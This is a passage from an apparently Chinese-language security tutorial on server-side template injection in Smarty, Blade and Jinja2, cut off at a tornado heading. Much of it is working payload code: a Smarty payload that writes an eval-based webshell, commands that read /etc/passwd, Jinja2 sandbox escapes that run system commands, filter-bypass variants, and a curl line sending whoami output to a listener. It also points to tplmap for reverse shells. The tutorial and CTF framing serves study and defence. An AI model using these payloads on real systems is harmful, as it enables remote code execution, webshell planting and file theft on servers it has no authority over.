<span class="variable">$_filepath</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$success</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_filepath&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// set file permissions</span></span><br><span class="line">            <span class="title function_ invoke__">chmod</span>(<span class="variable">$_filepath</span>, <span class="variable">$smarty</span>-&gt;_file_perms);</span><br><span class="line">            <span class="title function_ invoke__">umask</span>(<span class="variable">$old_umask</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，返回类型是Smarty 函数原型：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearConfig</span>(<span class="params"><span class="variable">$varname</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="title class_">Smarty_Internal_Extension_Config</span>::<span class="title function_ invoke__">clearConfig</span>(<span class="variable">$this</span>, <span class="variable">$varname</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></blockquote><p>因此我们可以构造payload写个webshell:</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="title class_">Smarty_Internal_Write_File</span>::<span class="title function_ invoke__">writeFile</span>(<span class="variable">$SCRIPT_NAME</span>,<span class="string">&quot;&lt;?php eval(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::<span class="title function_ invoke__">clearConfig</span>())&#125;</span><br></pre></td></tr></table></figure></div><h3 id="常见注入点"><a href="#常见注入点" class="headerlink" title="常见注入点"></a>常见注入点</h3><p>页面显示ip，考虑在受XFF控制，抓包修改X-Forwarded-For值为payload，可以先用<code>&#123;7*7&#125;</code>测试</p><p>如果没有特殊过滤，可以直接用system函数<code>&#123;system(&#39;cat /flag&#39;)&#125;</code></p><h3 id="常规利用方式"><a href="#常规利用方式" class="headerlink" title="常规利用方式"></a>常规利用方式</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="variable">$smarty</span>.version&#125;  <span class="comment">#获取smarty的版本号</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;php&#125;<span class="title function_ invoke__">phpinfo</span>();&#123;/php&#125;  <span class="comment">#执行相应的php代码</span></span><br></pre></td></tr></table></figure></div><blockquote><p>Smarty3版本中已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用</p></blockquote><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="title function_ invoke__">phpinfo</span>();&lt;/script&gt;   </span><br></pre></td></tr></table></figure></div><blockquote><p>这个地方借助了 {literal} 这个标签，因为 {literal} 可以让一个模板区域的字符原样输出。 这经常用于保护页面上的<u>Javascript或css样式表</u>，避免因为Smarty的定界符而错被解析。但是这种写法只适用于php5环境</p></blockquote><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="built_in">self</span>::<span class="title function_ invoke__">getStreamVariable</span>(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>读文件，3.1.30的Smarty版本中官方已经把该静态方法删除</p></blockquote><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>Smarty的 {if} 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{&#x2F;if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||，or，&amp;&amp;，and，is_array()等等，如：{if is_array($array)}{&#x2F;if}</p><p>也可以执行系统命令</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure></div></blockquote><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;./smarty/libs/&#x27;</span> . <span class="string">&#x27;Smarty.class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">    <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;string:&quot;</span>.<span class="variable">$ip</span>);     <span class="comment">// display函数把标签替换成对象的php变量；显示模板</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Blade"><a href="#Blade" class="headerlink" title="Blade"></a>Blade</h2><p><a class="link"   href="https://www.cnblogs.com/sgm4231/p/10283661.html" >laravel Blade 模板引擎 - 心之所依 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>Blade 模板引擎有三种常见的语法：</p><ul><li>通过 <code>&#123;&#123; &#125;&#125;</code> 渲染 PHP 变量（最常用）</li><li>通过 <code>&#123;!! !!&#125;</code> 渲染原生 HTML 代码（用于富文本数据渲染）</li><li>通过以 <code>@</code> 作为前缀的 Blade 指令执行一些控制结构和继承、引入之类的操作</li></ul><h3 id="渲染数据"><a href="#渲染数据" class="headerlink" title="渲染数据"></a>渲染数据</h3><p>我们来看一下 <code>&#123;&#123;&#125;&#125;</code> 语法，我们通过通过该语法包裹需要渲染的 PHP 变量，如 <code>&#123;&#123; $variable &#125;&#125;</code>，你可以将其类比为 <code>&lt;?php echo $variable; ?&gt;</code>，但是 Blade 模板代码的功能要更强大，通过 <code>&#123;&#123;&#125;&#125;</code> 语法包裹渲染的 PHP 变量会通过 <code>htmlentities()</code> 方法进行 HTML 字符转义，从而避免类似 XSS 这种攻击，提高了代码的安全性，所以 <code>&#123;&#123; $variable &#125;&#125;</code> 编译后的最终代码是：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$variable</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>但是某些情况下不能对变量中 HTML 字符进行转义，比如我们在表单通过富文本编辑器编辑后提交的表单数据，这种场景就需要通过 <code>&#123;!! !!&#125;</code> 来包裹待渲染数据了：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;!! <span class="variable">$variable</span> !!&#125;</span><br></pre></td></tr></table></figure></div><p>这样编译后的代码就是 <code>&lt;?php echo $variable; ?&gt;</code> 了</p><p>如果要注释一段 PHP 代码，可以通过 <code>&#123;&#123;-- 注释内容 --&#125;&#125;</code> 实现</p><h2 id="Python中的SSTI"><a href="#Python中的SSTI" class="headerlink" title="Python中的SSTI"></a>Python中的SSTI</h2><p>python常见的模板有：Jinja2，tornado</p><h2 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h2><p>Jinja2是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的</p><p>Jinja2是Flask框架的一部分。Jinja2会把模板参数提供的相应的值替换了<code> &#123;&#123;…&#125;&#125;</code> 块</p><p>Jinja2使用<code> &#123;&#123;name&#125;&#125;</code>结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。</p><p>Jinja2 模板同样支持控制语句，像在<code>&#123;%…%&#125;</code>块中，下面举一个常见的使用Jinja2模板引擎for语句循环渲染一组元素的例子：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">     &#123;% <span class="keyword">for</span> comment <span class="keyword">in</span> comments %&#125;</span><br><span class="line">         &lt;li&gt;&#123;&#123;comment&#125;&#125;&lt;/li&gt;</span><br><span class="line">     &#123;% endfor %&#125;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure></div><p>另外Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, &#123;&#123;name|capitalize&#125;&#125;</span><br></pre></td></tr></table></figure></div><h3 id="可注入情形代码"><a href="#可注入情形代码" class="headerlink" title="可注入情形代码"></a>可注入情形代码</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">&quot;Hello &quot;</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br></pre></td></tr></table></figure></div><blockquote><p>get传参 <code>&#123;&#123;2*2&#125;&#125;</code> 显示4</p></blockquote><h3 id="不可注入情形代码"><a href="#不可注入情形代码" class="headerlink" title="不可注入情形代码"></a>不可注入情形代码</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">&quot;Hello &#123;&#123;n&#125;&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> t.render(n=name)</span><br></pre></td></tr></table></figure></div><h3 id="用file对象读文件"><a href="#用file对象读文件" class="headerlink" title="用file对象读文件"></a>用file对象读文件</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> &#123;&#125;.__class__.__base__.__subclasses__():</span><br><span class="line">    <span class="keyword">if</span>(c.__name__==<span class="string">&#x27;file&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(c)</span><br><span class="line">        <span class="built_in">print</span> c(<span class="string">&#x27;joker.txt&#x27;</span>).readlines()</span><br></pre></td></tr></table></figure></div><blockquote><p>上述代码先通过__class__获取字典对象所属的类，再通过__base__（__bases[0]<strong>）拿到基类，然后使用__subclasses</strong>()获取子类列表，在子类列表中直接寻找可以利用的类</p></blockquote><p>再使用jinja2的语法封装成可解析的样子：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__==&#x27;file&#x27; %&#125;</span><br><span class="line">&#123;&#123; c(&quot;/etc/passwd&quot;).readlines() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p><strong><font color='red'>python3已经移除了file。所以利用file子类文件读取只能在python2中用。</font></strong></p></blockquote><h3 id="内置模块执行命令"><a href="#内置模块执行命令" class="headerlink" title="内置模块执行命令"></a>内置模块执行命令</h3><p>可以用__globals__更深入的去看每个类可以调用的东西（包括模块，类，变量等等），如果有os这种可以直接传入命令，造成命令执行</p><p>先用脚本找到在哪个子类中，得到下标</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8search = &#x27;os&#x27;   #也可以是其他你想利用的模块</span></span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            <span class="built_in">print</span>(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span> </span><br></pre></td></tr></table></figure></div><p>可以看到在元组68，73的位置找到了os方法，这样就可以构造命令执行payload:</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">68</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">().__class__.__base__.__subclasses__()[<span class="number">73</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">68</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">73</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure></div><blockquote><p><strong><font color='red'>不过同样，只能在python2版本使用</font></strong></p></blockquote><p>推荐__builtins__：</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(i.__init__.__globals__.keys())</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            <span class="built_in">print</span>(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div><p>python3：</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">64</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>python2：</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure></div><h3 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a>基础payload</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">获得基类</span><br><span class="line"><span class="comment">#python2.7</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">request.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#python3.7</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__。。。class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">request.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#python 2.7</span></span><br><span class="line"><span class="comment">#文件操作</span></span><br><span class="line"><span class="comment">#找到file类</span></span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>]</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp&#x27;</span>).write(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#命令执行</span></span><br><span class="line"><span class="comment">#os执行</span></span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache下有os类，可以直接执行命令：</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line"><span class="comment">#eval,impoer等全局函数</span></span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__下有<span class="built_in">eval</span>，<span class="built_in">__import__</span>等的全局函数，可以利用此来执行命令：</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#python3.7</span></span><br><span class="line"><span class="comment">#命令执行</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"><span class="comment">#文件操作</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"><span class="comment">#windows下的os命令</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">118</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;dir&#x27;</span>).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h3 id="绕过WAF姿势"><a href="#绕过WAF姿势" class="headerlink" title="绕过WAF姿势"></a>绕过WAF姿势</h3><p><strong>过滤[</strong></p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#getitem、pop</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br></pre></td></tr></table></figure></div><p><strong>过滤引号</strong></p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chr函数</span></span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">chr</span> %&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">101</span>)%2bchr(<span class="number">116</span>)%2bchr(<span class="number">99</span>)%2bchr(<span class="number">47</span>)%2bchr(<span class="number">112</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">119</span>)%2bchr(<span class="number">100</span>)).read()&#125;&#125;<span class="comment">#request对象</span></span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd</span><br><span class="line"><span class="comment">#命令执行</span></span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">chr</span> %&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="built_in">chr</span>(<span class="number">105</span>)%2bchr(<span class="number">100</span>)).read() &#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=<span class="built_in">id</span></span><br></pre></td></tr></table></figure></div><p><strong>过滤下划线</strong></p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[request.args.<span class="keyword">class</span>][request.args.mro][<span class="number">2</span>][request.args.subclasses]()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read() &#125;&#125;&amp;<span class="keyword">class</span>=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure></div><p><strong>过滤花括号</strong></p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用&#123;%%&#125;标记</span></span><br><span class="line">&#123;% <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;</span>).read()==<span class="string">&#x27;p&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></div><p>这里推荐自动化工具tplmap，拿shell、执行命令、bind_shell、反弹shell、上传下载文件，Tplmap为SSTI的利用提供了很大的便利</p><h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2><p>tornado 